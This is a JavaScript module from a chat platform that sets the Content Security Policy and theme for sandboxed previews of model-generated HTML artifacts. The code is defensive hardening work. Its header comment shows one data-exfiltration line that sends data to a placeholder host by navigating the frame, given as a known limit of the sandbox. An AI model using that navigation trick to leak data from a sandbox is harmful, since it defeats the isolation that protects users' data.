// SPDX-FileCopyrightText: IntraFind Software AG
// SPDX-License-Identifier: LicenseRef-iHub-Apps

/**
 * How an HTML artifact is prepared for its sandboxed preview: the Content
 * Security Policy it runs under, and the theme it is told to use. One module
 * for the chat's Artifacts panel (client), the share embed page and the
 * `create_web_artifact` checks (server), so the three cannot drift apart.
 *
 * The preview runs a model's markup in `<iframe sandbox="allow-scripts">`
 * (opaque origin, no access to the parent, cookies or storage). Inside it:
 *
 * - inline script and style run, and so do `eval` and `new Function`, which
 *   libraries such as Alpine.js, Vue's template compiler or Babel standalone
 *   need; in an opaque-origin frame they grant nothing inline script does not;
 * - scripts and stylesheets load from the CDN hosts the admin allowlisted in
 *   `platform.artifacts.scriptHosts` (an empty list keeps the preview offline);
 * - nothing else goes out: no `fetch`, XHR, WebSocket, remote image, font,
 *   frame or form post (`default-src 'none'`).
 *
 * Known limit: CSP does not govern navigation of the frame itself, and the
 * iframe's `sandbox="allow-scripts"` does not block it either, so a script can
 * still run `location.href = 'https://host/?' + data` (or use `<meta refresh>`).
 * The sandbox does stop top-level navigation, popups and access to the parent,
 * cookies and storage.
 *
 * @module shared/artifactPreview
 */

/** The CDN hosts an HTML artifact may load scripts and stylesheets from when the platform says nothing. */
export const DEFAULT_ARTIFACT_SCRIPT_HOSTS = Object.freeze([
  'cdnjs.cloudflare.com',
  'cdn.jsdelivr.net',
  'unpkg.com'
]);

const HOST_LABEL = '[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?';
const HOST_RE = new RegExp(`^${HOST_LABEL}(?:\\.${HOST_LABEL})+$`);

/**
 * The script hosts an admin configured, as bare lowercase host names. Accepts
 * `cdn.example.com` and `https://cdn.example.com/`; anything that is not a
 * plain host (a wildcard, a path, a port, `http:`) is dropped, because the
 * value ends up in a CSP and an `https:` source list is all it may widen.
 * Not an array (the key is absent) means the defaults; `[]` means none.
 *
 * @param {unknown} value - `platform.artifacts.scriptHosts`.
 * @returns {string[]}
 */
export function normalizeScriptHosts(value) {
  if (!Array.isArray(value)) return [...DEFAULT_ARTIFACT_SCRIPT_HOSTS];
  const hosts = [];
  for (const entry of value) {
    if (typeof entry !== 'string') continue;
    const host = entry
      .trim()
      .toLowerCase()
      .replace(/^https:\/\//, '')
      .replace(/\/+$/, '');
    if (HOST_RE.test(host) && host.length <= 253 && !hosts.includes(host)) hosts.push(host);
  }
  return hosts;
}

/**
 * Content Security Policy of a previewed HTML artifact.
 *
 * @param {string[]} [scriptHosts] - Hosts scripts and stylesheets may load from (normalized).
 * @returns {string}
 */
export function artifactPreviewCsp(scriptHosts = []) {
  const remote = normalizeScriptHosts(scriptHosts)
    .map(host => ` https://${host}`)
    .join('');
  return (
    "default-src 'none'; " +
    `script-src 'unsafe-inline' 'unsafe-eval'${remote}; ` +
    `style-src 'unsafe-inline'${remote}; ` +
    'img-src data: blob:; font-src data:; media-src data: blob:; ' +
    "form-action 'none'; base-uri 'none'"
  );
}

/**
 * Whether a URL points at one of the allowed script hosts over https.
 *
 * @param {string} url - Absolute or protocol-relative URL.
 * @param {string[]} scriptHosts - Normalized hosts.
 * @returns {boolean}
 */
export function isAllowedScriptUrl(url, scriptHosts) {
  const match = /^(?:https:)?\/\/([^/?#:]+)(?=[/?#]|$)/i.exec(String(url || '').trim());
  return Boolean(match) && scriptHosts.includes(match[1].toLowerCase());
}

/**
 * Put the preview CSP — and, when given, the viewer's theme — in front of an
 * HTML artifact's markup. A leading doctype stays first so the document does
 * not fall into quirks mode.
 *
 * The theme is set as `data-theme` on the artifact's root element before any
 * of its own markup is parsed. `prefers-color-scheme` inside the frame follows
 * the operating system, not iHub's own light/dark switch, so an artifact that
 * styles `:root[data-theme="dark"]` (as the web-artifacts skill asks) matches
 * the app around it.
 *
 * @param {unknown} html - Artifact markup.
 * @param {{scriptHosts?: string[], theme?: 'light'|'dark'}} [options]
 * @returns {string}
 */
export function prepareHtmlPreview(html, { scriptHosts = [], theme } = {}) {
  const source = String(html ?? '');
  let head = `<meta http-equiv="Content-Security-Policy" content="${artifactPreviewCsp(scriptHosts)}">`;
  if (theme === 'dark' || theme === 'light') {
    head += `<script>document.documentElement.setAttribute('data-theme','${theme}')</script>`;
  }
  const doctype = source.match(/^\s*<!doctype[^>]*>/i);
  if (!doctype) return head + source;
  return doctype[0] + head + source.slice(doctype[0].length);
}
